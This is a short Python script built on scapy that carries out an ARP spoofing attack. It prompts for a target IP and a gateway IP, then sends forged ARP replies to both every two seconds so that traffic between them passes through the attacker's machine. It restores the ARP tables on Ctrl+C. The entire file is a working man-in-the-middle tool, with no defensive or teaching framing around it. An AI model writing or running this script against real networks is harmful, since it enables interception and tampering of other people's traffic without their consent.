#!/usr/bin/env python

import scapy.all as scapy
import time


try:
    target_ip = input("ENTER THE TARGET IP ADDRESS :")
    gateway_ip = input("ENTER THE GATEWAY IP ADDRESS :")
    print("the values entered successfully into arp spoofer tool >>>>>...>>>>>")
except KeyboardInterrupt:
    print("\n[-] detected CTRL +C .......Resetting ARP Tables.......please WAIT\n")


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip,)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] packets send: " + str(packets_sent_count), end=" ")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] detected CTRL +C .......Resetting ARP Tables.......please WAIT\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
